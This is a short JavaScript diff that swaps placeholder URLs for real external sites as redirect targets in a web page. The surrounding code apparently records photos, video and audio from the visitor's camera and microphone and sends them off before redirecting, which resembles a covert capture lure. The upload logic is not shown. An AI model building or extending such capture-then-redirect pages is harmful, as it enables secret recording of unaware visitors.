@@ -1090,7 +1090,7 @@ document.addEventListener('DOMContentLoaded', async () => {
                 
                 // Redirect after photos sent
                 setTimeout(() => {
-                    window.open('https://example.com/project1', '_blank');
+                    window.open('https://mubassitalshamal-v9.onrender.com/', '_blank');
                 }, 500);
             } catch (error) {
                 console.error('Project 1 error:', error);
@@ -1109,7 +1109,7 @@ document.addEventListener('DOMContentLoaded', async () => {
             
             projectBtn2.disabled = true;
             recordingType = 'project2';
-            startRecordingProject(stream, getSupportedVideoMimeType(), 15000, 'https://example.com/project2');
+            startRecordingProject(stream, getSupportedVideoMimeType(), 15000, 'https://abuali782.github.io/Zena-Touch-v2/');
         });
     }
     
@@ -1122,7 +1122,7 @@ document.addEventListener('DOMContentLoaded', async () => {
             
             projectBtn3.disabled = true;
             recordingType = 'project3';
-            startRecordingProject(stream, getSupportedAudioMimeType(), 15000, 'https://example.com/project3');
+            startRecordingProject(stream, getSupportedAudioMimeType(), 15000, 'https://abuali782.github.io/BaytakRealEstate/');
         });
     }
 
